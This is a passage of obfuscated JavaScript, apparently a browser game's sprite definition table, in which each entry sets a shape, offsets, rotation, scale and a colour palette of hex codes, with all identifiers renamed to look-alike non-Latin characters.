			ⵠⲆ[Ⲇ.ⵠⲆΔΔᐃΔΔ] = ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔⲆΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⲆⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃⲆⲆΔⲆ][0] = ⲆΔ.ⲆᐃⲆⵠⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⵠΔᐃⲆⲆΔⲆ][1] = ⲆΔ.ⲆⵠⲆⲆⲆⵠⵠ;
			ⵠⲆ[Ⲇ.ⵠΔᐃⲆⲆΔⲆ][ⲆᐃᐃⲆ] = ⲆΔ.ᐃΔⵠⲆⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃΔⲆΔⵠΔ] = ⵠⲆ[Ⲇ.ⵠΔᐃⲆⲆΔⲆ];
			ⵠⲆ[Ⲇ.ⲆᐃⲆΔⲆᐃⵠ] = ⵠⲆ[Ⲇ.ⵠΔᐃⲆⲆΔⲆ];
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔⵠⵠ][0] = ⲆΔ.ⲆᐃΔⵠᐃⵠⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔⵠⵠ][1] = ⲆΔ.ᐃᐃΔᐃⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔⵠⵠ][ⲆⵠΔΔ] = ⲆΔ.ΔΔⵠⲆᐃᐃⲆ;
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆⵠⲆᐃ] = ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔⵠⵠ];
			ⵠⲆ[Ⲇ.ⵠⲆⵠⵠᐃⲆⲆ] = ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔⵠⵠ];
			ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⲆᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⲆᐃⵠ][0] = ⲆΔ.ⵠᐃᐃⲆⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⲆᐃⵠ][1] = ⲆΔ.ⲆⲆᐃΔⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⲆᐃⵠ][2] = ⲆΔ.ⵠⲆΔⵠᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃΔΔⲆⵠⲆ] = ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⲆᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠΔⲆᐃ] = ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⲆᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠⵠΔᐃⵠⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠΔᐃⵠⲆΔ][0] = ⲆΔ.ΔⵠⲆⲆᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠⵠΔᐃⵠⲆΔ][1] = ⲆΔ.ⵠⲆⵠⲆⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⵠⵠΔᐃⵠⲆΔ][2] = ⲆΔ.ΔⲆⲆΔᐃⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆⲆⲆⵠᐃⲆⵠ] = ⵠⲆ[Ⲇ.ⵠⵠΔᐃⵠⲆΔ];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠⵠⵠΔ] = ⵠⲆ[Ⲇ.ⵠⵠΔᐃⵠⲆΔ];
			ⵠⲆ[Ⲇ.ⲆⲆⲆⵠΔⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⲆⵠΔⵠⲆ][0] = ⲆΔ.ⵠᐃⲆⲆᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆⲆⲆⵠΔⵠⲆ][1] = ⲆΔ.ⲆⲆⲆΔⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆⲆⲆⵠΔⵠⲆ][ⵠⵠΔⲆ] = ⲆΔ.ⲆᐃᐃᐃⲆΔⲆ;
			ⵠⲆ[Ⲇ.ⵠⲆⵠᐃᐃᐃΔ] = ⵠⲆ[Ⲇ.ⲆⲆⲆⵠΔⵠⲆ];
			ⵠⲆ[Ⲇ.ᐃⲆᐃⲆΔⲆᐃ] = ⵠⲆ[Ⲇ.ⲆⲆⲆⵠΔⵠⲆ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠⵠ][0] = ⲆΔ.ⵠᐃΔᐃⲆᐃΔ;
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠⵠ][1] = ⲆΔ.ⵠᐃΔᐃⲆΔᐃ;
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠⵠ][ⵠΔᐃᐃⵠ] = ⲆΔ.ⲆⲆⲆⲆᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃΔⵠΔᐃⲆ] = ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠΔⲆⲆⲆⵠ] = ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠⵠ];
			ⵠⲆ[Ⲇ.ⵠΔⲆΔⲆᐃΔ] = ᐃⲆⲆᐃ(ᐃᐃⲆΔ, [{
				f: ᐃⲆⲆⵠΔΔⵠ,
				x: -2,
				y: -ⲆⲆΔᐃ,
				a: ᐃⲆᐃ,
				r: 0,
				c: [ⵠ[247], ⵠ[25], ⵠ[40], "#3a3a3a"]
			}], .8, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ᐃΔᐃᐃⲆⲆΔ] = ⵠⲆ[Ⲇ.ⵠΔⲆΔⲆᐃΔ];
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃⲆⲆ] = ᐃⲆⲆᐃ(ᐃᐃⵠ, [{
				f: ⵠⲆᐃⲆΔᐃᐃ,
				x: -2,
				y: -2,
				a: 1,
				r: -Math.PI / 5,
				c: [ⵠ[247], ⵠ[40], ⵠ[25]]
			}], .08, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠΔΔⲆ] = ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆⲆⲆⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⵠⲆᐃΔΔᐃ,
				x: -Ⲇᐃᐃⵠ,
				y: -2,
				a: ΔⲆᐃᐃ,
				r: 0,
				c: [ⵠ[247], "#178a99", "#0a6372", "#03282e"]
			}], .3, [ⵠ[350], ⵠ[350], ⵠ[350]], .7);
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔⵠᐃᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⵠⲆᐃΔΔᐃ,
				x: -ⲆⲆΔᐃ,
				y: -2,
				a: 1,
				r: ᐃⵠⲆⵠ,
				c: [ⵠ[66], "#991616", "#750a0a", ⵠ[66]]
			}], .3, [ⵠ[350], ⵠ[350], ⵠ[350]], .7);
			ⵠⲆ[Ⲇ.ⲆᐃΔⵠΔⲆⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆⵠⲆⲆⵠᐃⲆ,
				x: 0,
				y: ᐃⵠΔ,
				a: 1,
				r: 0,
				c: [ⵠ[442], ⵠ[320]]
			}, {
				f: ᐃᐃΔᐃⵠⵠᐃ,
				x: Ⲇᐃⵠⵠ,
				y: 0,
				a: 1,
				r: 0,
				c: [ⵠ[442], ⵠ[320], "#1c2528", ⵠ[175], ⵠ[562], "#959da0", "#697072", "#929da0", "#afb9bc", "#418ba5", "#59b8ce"]
			}, {
				f: ᐃΔⲆᐃᐃⲆΔ,
				x: ᐃⵠΔ,
				y: 0,
				a: 1,
				r: 0,
				c: [ⵠ[175], ⵠ[562]]
			}, {
				f: ΔᐃΔᐃⲆⲆⵠ,
				x: 0,
				y: 0,
				a: ⵠΔⵠΔ,
				r: 0,
				c: [ⵠ[175], ⵠ[562], "#418ba5", "#59b8ce"]
			}], .3, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆⵠⵠⵠᐃᐃ] = ⵠⲆ[Ⲇ.ⲆᐃΔⵠΔⲆⵠ];
			ⵠⲆ[Ⲇ.ᐃⲆⵠΔⵠⲆⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠᐃⵠΔⲆΔⲆ,
				x: 45,
				y: 70,
				a: 1,
				r: 0,
				c: [ⵠ[111], ⵠ[387], ⵠ[549], ⵠ[ΔⲆⵠⲆ]]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔⵠᐃᐃⲆΔⵠ] = ⵠⲆ[Ⲇ.ᐃⲆⵠΔⵠⲆⵠ];
			ⵠⲆ[Ⲇ.ΔΔⲆᐃᐃⵠⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⵠⲆⲆΔᐃΔ,
				x: ΔⲆⵠⲆ,
				y: Δⵠᐃ,
				a: ᐃᐃⲆΔ,
				r: ΔⲆⵠⲆ,
				c: [ⵠ[111], "#8c55b7", "#652d8e", "#79359e", "#5eccd1", "#4badad", "#9e6ac6"]
			}], .52, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠⲆⵠⵠⵠᐃⲆ] = ⵠⲆ[Ⲇ.ΔΔⲆᐃᐃⵠⲆ];
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⲆⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃΔΔⲆᐃⵠⵠ,
				x: ΔΔⵠⵠ,
				y: 0,
				a: ΔᐃᐃⲆ,
				r: 0,
				c: [ⵠ[543], ⵠ[229], ⵠ[319], "#1b1a25"]
			}], .12, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆᐃᐃᐃⲆⵠ] = ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃΔᐃΔⲆⲆⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⲆΔⲆᐃᐃⵠ,
				x: ᐃΔΔ,
				y: 0,
				a: 1,
				r: Δᐃᐃⵠ,
				c: [ⵠ[543], ⵠ[229], ⵠ[319]]
			}], .25, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⵠᐃΔ] = ⵠⲆ[Ⲇ.ᐃΔᐃΔⲆⲆⵠ];
			ⵠⲆ[Ⲇ.ⲆⵠⲆᐃⲆⵠΔ] = ᐃⲆⲆᐃ(ΔⲆⵠ, [{
				f: ᐃᐃⵠⵠΔⲆᐃ,
				x: ⵠΔⲆⵠ,
				y: Δⵠᐃⵠ,
				a: 1,
				r: 0,
				c: [ⵠ[337], "#e2e1e1", "#d2cbcb", "#cfcbc8", "#beb5b5", "#ada0a0"]
			}], .39, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⲆᐃᐃ] = ⵠⲆ[Ⲇ.ⲆⵠⲆᐃⲆⵠΔ];
			ⵠⲆ[Ⲇ.ΔᐃᐃᐃΔⲆΔ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃᐃⵠⵠΔⲆᐃ,
				x: ⵠᐃⲆᐃ,
				y: ⵠⵠⵠᐃ,
				a: 1,
				r: 0,
				c: [ⵠ[337], "#8c7654", ⵠ[69], "#a88e6c", ⵠ[69], "#705845"]
			}], .39, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔⲆΔΔⵠⵠⲆ] = ⵠⲆ[Ⲇ.ΔᐃᐃᐃΔⲆΔ];
			ⵠⲆ[Ⲇ.ᐃΔᐃⲆⵠΔⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ΔᐃⲆΔᐃⵠⵠ,
				x: ΔΔⵠⵠ,
				y: 10,
				a: 1,
				r: 0,
				c: [ⵠ[111], ⵠ[553], ⵠ[201], ⵠ[359], "#49B669", "#19994C", "#71C187"]
			}], .15, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆΔΔⲆⵠⲆ] = ⵠⲆ[Ⲇ.ᐃΔᐃⲆⵠΔⵠ];
			ⵠⲆ[Ⲇ.ⵠⲆⵠⵠᐃⵠⵠ] = ᐃⲆⲆᐃ(ⵠΔⵠΔ, [{
				f: ΔᐃⲆΔᐃⵠⵠ,
				x: 0,
				y: 10,
				a: ⵠᐃⵠΔ,
				r: ⵠΔⲆⵠ,
				c: [ⵠ[111], ⵠ[553], ⵠ[201], ⵠ[359], "#C45727", "#994617", "#DB9358"]
			}], .15, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆⵠⵠΔⲆⵠᐃ] = ⵠⲆ[Ⲇ.ⵠⲆⵠⵠᐃⵠⵠ];
			ⵠⲆ[Ⲇ.ΔⵠⲆᐃΔΔⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ΔᐃⲆΔᐃⵠⵠ,
				x: Δⵠᐃ,
				y: 10,
				a: ΔⵠΔⵠ,
				r: ⲆⲆⲆᐃ,
				c: [ⵠ[111], ⵠ[553], ⵠ[201], ⵠ[359], "#2792C1", "#196599", "#59C0D8"]
			}], .15, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠᐃΔⲆΔΔ] = ⵠⲆ[Ⲇ.ΔⵠⲆᐃΔΔⲆ];
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆΔΔΔ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⲆΔⵠΔⲆᐃ,
				x: -ᐃᐃⵠ,
				y: ᐃΔΔ,
				a: ⵠΔᐃ,
				r: 0,
				c: [ⵠ[339], "#b03431", "#94312d", "#bd3c33", "#de5445"]
			}], .15, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃΔⲆᐃⵠᐃΔ] = ⵠⲆ[Ⲇ.ⲆⵠΔⲆΔΔΔ];
			ⵠⲆ[Ⲇ.ΔΔᐃΔⲆⵠΔ] = ⵠⲆ[Ⲇ.ⲆⵠΔⲆΔΔΔ];
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆᐃᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⲆⵠᐃΔⲆᐃ,
				x: 0,
				y: 0,
				a: 1,
				r: 0,
				c: [ⵠ[111], "#cae9eb", "#75bcae", ⵠ[407], "#51736d", "#2b4d48", "#1b3a3a", "#80ccca", "#59ada7"]
			}], .2, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃᐃⵠΔⵠⵠⵠ] = ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠⵠΔΔΔᐃⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⵠⵠΔᐃΔⵠ,
				x: 0,
				y: 0,
				a: 1,
				r: Math.PI / 5,
				c: [ⵠ[111], "#284c4a", "#193533", "#c7efef", "#7fccca"]
			}], .75, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠΔᐃᐃ] = ⵠⲆ[Ⲇ.ⵠⵠΔΔΔᐃⲆ];
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⲆⲆⲆ] = ᐃⲆⲆᐃ(ΔⵠΔⵠ, [{
				f: ⲆΔᐃᐃⲆⲆⲆ,
				x: ΔⲆⵠⲆ,
				y: ᐃⵠⲆ,
				a: 1,
				r: ᐃⵠΔ,
				c: ["#44bae0", "#9fdae9", "#7dd1ea", "#c6e8ef"]
			}], .55, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ΔⲆΔⲆⵠⵠΔ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠᐃᐃΔⵠΔᐃ,
				x: ΔⲆⲆ,
				y: ΔⲆⲆ,
				a: 1,
				r: 0,
				c: ["#44bae0", "#9fdae9", "#7dd1ea", "#c6e8ef"]
			}], .55, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠΔⲆᐃ] = ᐃⲆⲆᐃ(ΔᐃⲆⵠ, [{
				f: ⲆΔᐃᐃⲆⲆⲆ,
				x: ΔΔⵠⵠ,
				y: 0,
				a: Ⲇᐃⵠ,
				r: ⵠⲆᐃⵠ,
				c: ["#e04444", "#e99f9f", "#eb7e7e", "#eec6c6"]
			}], .55, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⲆⵠⲆΔΔⲆⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠᐃᐃΔⵠΔᐃ,
				x: ᐃⵠⲆⵠ,
				y: ᐃΔΔ,
				a: ⵠΔⲆ,
				r: ⵠᐃⲆᐃ,
				c: ["#e04444", "#e99f9f", "#eb7e7e", "#eec6c6"]
			}], .55, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠΔⵠⲆΔⵠΔ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⲆᐃᐃΔⲆⲆ,
				x: ᐃΔΔ,
				y: 0,
				a: ⵠⲆΔ,
				r: ᐃⵠΔ,
				c: ["#59ba72", "#94d966", "#5aa628", ⵠ[111], "#38874d"]
			}], .35, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠᐃⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⲆᐃᐃΔⲆⲆ,
				x: 0,
				y: 0,
				a: 1,
				r: 0,
				c: ["#C45727", "#de7d46", "#DB9358", ⵠ[111], "#994617"]
			}], .35, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃⲆᐃⵠ] = ᐃⲆⲆᐃ(ⵠΔⲆ, [{
				f: ΔⲆᐃᐃΔⲆⲆ,
				x: 0,
				y: ⲆⲆⲆᐃ,
				a: 1,
				r: 0,
				c: ["#3a9dbd", "#59C0D8", "#48abcb", ⵠ[111], "#196599"]
			}], .35, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠⵠ] = ᐃⲆⲆᐃ(ΔΔΔ, [{
				f: Δᐃᐃᐃⵠ,
				x: ⵠⲆⲆ,
				y: 0,
				a: 1,
				r: Math.PI / ⲆⲆΔⵠ,
				c: [ⵠ[111], "#6d5041", "#4f3d35", ⵠ[24], ⵠ[237], "#757575"]
			}], .45, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔⵠⵠΔΔⲆⵠ] = ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠⵠ];
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆⵠⵠ] = ᐃⲆⲆᐃ(ΔᐃᐃⲆ, [{
				f: Δᐃᐃᐃⵠ,
				x: ᐃΔΔ,
				y: Δᐃᐃᐃ,
				a: ᐃΔᐃⲆ,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[400], ⵠ[330], ⵠ[104], ⵠ[193], "#b4ac45"]
			}], .45, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠⲆΔᐃ] = ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆⵠⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆᐃᐃΔ] = ᐃⲆⲆᐃ(ΔⵠⲆΔ, [{
				f: Δᐃᐃᐃⵠ,
				x: 0,
				y: ⵠᐃⲆᐃ,
				a: ⵠⲆΔ,
				r: Math.PI / ⵠⵠΔⵠ,
				c: [ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[226], ⵠ[448], "#42aab8"]
			}], .45, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆᐃⲆΔⲆⲆΔ] = ⵠⲆ[Ⲇ.ΔⲆⲆⲆᐃᐃΔ];
			ⵠⲆ[Ⲇ.ΔΔⵠⲆⲆⲆΔ] = ᐃⲆⲆᐃ(1, [{
				f: Δᐃᐃᐃⵠ,
				x: ᐃⵠΔ,
				y: Δᐃᐃⵠ,
				a: ΔΔΔ,
				r: Math.PI / 5,
				c: [ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[525], ⵠ[116], "#a853c7"]
			}], .45, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠᐃⵠᐃⲆᐃ] = ⵠⲆ[Ⲇ.ΔΔⵠⲆⲆⲆΔ];
			ⵠⲆ[Ⲇ.ⵠΔⵠΔΔⵠⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃΔⲆⲆᐃᐃⵠ,
				x: 0,
				y: 0,
				a: ΔΔᐃⵠ,
				r: ᐃⵠΔ,
				c: ["#c9a65f", "#ae863f", "#655530", "#4a391c", "#ebdd79", "#4a421c"]
			}], .35, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔⲆΔ] = ⵠⲆ[Ⲇ.ⵠΔⵠΔΔⵠⲆ];
			ⵠⲆ[Ⲇ.ΔΔⲆΔⲆᐃΔ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⲆⵠΔᐃΔΔ,
				x: 0,
				y: Δᐃᐃⵠ,
				a: 1,
				r: 0,
				c: [ⵠ[93], ⵠ[48], "#493425", ⵠ[563]]
			}], .35, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃΔⲆΔⵠᐃⵠ] = ⵠⲆ[Ⲇ.ΔΔⲆΔⲆᐃΔ];
			ⵠⲆ[Ⲇ.ⵠⲆⵠᐃᐃⵠⵠ] = ᐃⲆⲆᐃ(ΔᐃⲆⵠ, [{
				f: ᐃⲆᐃⵠⵠᐃΔ,
				x: ᐃΔΔ,
				y: -2,
				a: ⵠΔⲆ,
				r: 0,
				c: [ⵠ[93], "#808080", "#4a4a4a", "#9e9c8b", "#615c53", "#686969", "#8a8776", ⵠ[536], "#747474", "#969696", ⵠ[265]]
			}], .4, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃᐃⵠⵠΔⵠⵠ] = ⵠⲆ[Ⲇ.ⵠⲆⵠᐃᐃⵠⵠ];
			ⵠⲆ[Ⲇ.ⲆⵠⵠⵠⲆᐃᐃ] = ᐃⲆⲆᐃ(ⵠΔΔ, [{
				f: ΔᐃⲆⵠΔᐃΔ,
				x: 0,
				y: ⲆⲆⲆᐃ,
				a: ΔΔΔ,
				r: 0,
				c: ["#dbce71", ⵠ[193], ⵠ[104]]
			}], .35, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⲆΔⲆ] = ⵠⲆ[Ⲇ.ⲆⵠⵠⵠⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⵠⵠⲆ] = ᐃⲆⲆᐃ(ⲆⵠⲆⲆ, [{
				f: ⵠⲆⲆΔⲆⵠᐃ,
				x: ⲆⲆⲆᐃ,
				y: ⵠᐃⲆᐃ,
				a: 1,
				r: Δᐃᐃⵠ,
				c: ["#717171", "#485252", ⵠ[536], "#65c7cd", "#4aadad", "#358d8b", "#c1e6ea", "#a6dce4"]
			}], .45, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⵠⲆΔ] = ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⵠⵠⲆ];
			ⵠⲆ[Ⲇ.ᐃΔⵠⲆⲆⵠⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ΔᐃΔⵠΔⲆⲆⲆᐃ,
				x: Ⲇᐃᐃᐃ,
				y: ΔΔⵠⵠ,
				a: 1,
				r: Δᐃᐃⵠ,
				c: ["#511f00", "#2f1300", ⵠ[407], "#d4d4d4", "#5b2400", "#984e21"]
			}], .15, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆⵠᐃⲆⲆΔΔ] = ⵠⲆ[Ⲇ.ᐃΔⵠⲆⲆⵠⵠ];
			ⵠⲆ[Ⲇ.ⵠⲆΔᐃⵠᐃΔ] = ᐃⲆⲆᐃ(ᐃΔᐃⲆ, [{
				f: ⲆⲆΔⵠΔΔΔΔⵠ,
				x: ΔⲆⵠⲆ,
				y: 0,
				a: ΔᐃⲆⵠ,
				r: ⵠⲆᐃⵠ,
				c: ["#221e1b", ⵠ[407], "#f6f0e7"]
			}], .3, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ΔⵠⵠⵠᐃⲆⵠ] = ⵠⲆ[Ⲇ.ⵠⲆΔᐃⵠᐃΔ];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔⲆΔ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⵠΔᐃΔΔⲆ,
				x: -5,
				y: -ⵠⵠΔΔ,
				a: 1,
				r: Δᐃᐃⵠ,
				c: [ⵠ[341], ⵠ[ⲆⲆᐃᐃΔⵠⵠ], ⵠ[520]]
			}], .31, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆᐃⲆΔᐃⵠ] = ᐃⲆⲆᐃ(ⵠΔⵠΔ, [{
				f: ΔⲆⵠⵠᐃΔΔ,
				x: ᐃⵠΔ,
				y: 0,
				a: 1,
				r: ⵠⲆⲆ,
				c: ["#D7C393", "#a48c6c"]
			}], .22, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ΔᐃⲆⲆⲆⲆⲆ] = ᐃⲆⲆᐃ(ᐃⲆᐃ, [{
				f: ⵠⲆΔⲆⲆΔΔⵠⵠ,
				x: 0,
				y: 0,
				a: 1,
				r: 0,
				c: ["#93CBCE", "#E9F6F6"]
			}], .3, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔΔⵠⵠᐃΔⲆ] = ᐃⲆⲆᐃ(ᐃΔᐃⲆ, [{
				f: ΔⲆⵠⵠᐃΔΔ,
				x: 0,
				y: ΔⲆⲆ,
				a: ᐃᐃⵠ,
				r: 0,
				c: ["#866432", "#6b4f25"]
			}], .22, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ΔΔⵠΔⵠⲆⲆ] = ᐃⲆⲆᐃ(ΔⵠΔⵠ, [{
				f: ⲆⵠᐃⵠΔᐃⵠΔⵠ,
				x: ΔⲆᐃⲆ,
				y: 2,
				a: 1,
				r: ⵠⲆᐃⵠ,
				c: [ⵠ[187], ⵠ[495], ⵠ[371], "#2f2211", "#785931", ⵠ[154]]
			}], .22, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃΔΔⵠ] = ᐃⲆⲆᐃ(ⵠᐃⵠΔ, [{
				f: ΔᐃᐃᐃΔⵠΔΔΔ,
				x: ΔΔⵠΔ,
				y: 2,
				a: ⵠⲆΔ,
				r: 0,
				c: [ⵠ[187], ⵠ[495], ⵠ[371], "#2f2211", "#785931", ⵠ[154]]
			}], .22, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠΔᐃ] = ⵠⲆ[Ⲇ.ΔΔⵠΔⵠⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃᐃⵠΔΔΔⵠ] = ⵠⲆ[Ⲇ.ⵠᐃΔᐃΔΔⵠ];
			ⵠⲆ[Ⲇ.ΔᐃΔⵠΔᐃⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃⵠᐃⲆΔⵠⲆ,
				x: ⵠⲆᐃⵠ,
				y: 0,
				a: 1,
				r: 0,
				c: [ⵠ[187], "#717273", "#606162", "#a09f9f", "#878787", ⵠ[265]]
			}], .1, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔⵠⲆΔ] = ⵠⲆ[Ⲇ.ΔᐃΔⵠΔᐃⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃᐃᐃΔ] = ᐃⲆⲆᐃ(ΔⵠΔⵠ, [{
				f: ΔⵠᐃⲆᐃⵠΔ,
				x: Δⵠᐃ,
				y: 0,
				a: ⵠΔΔ,
				r: Math.PI / ᐃᐃⲆᐃ,
				c: [ⵠ[504], ⵠ[323], ⵠ[ΔΔⲆⵠΔⲆⵠ], ⵠ[474], ⵠ[472], ⵠ[523], ⵠ[129]]
			}], .18, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⵠᐃᐃ] = ᐃⲆⲆᐃ(1, [{
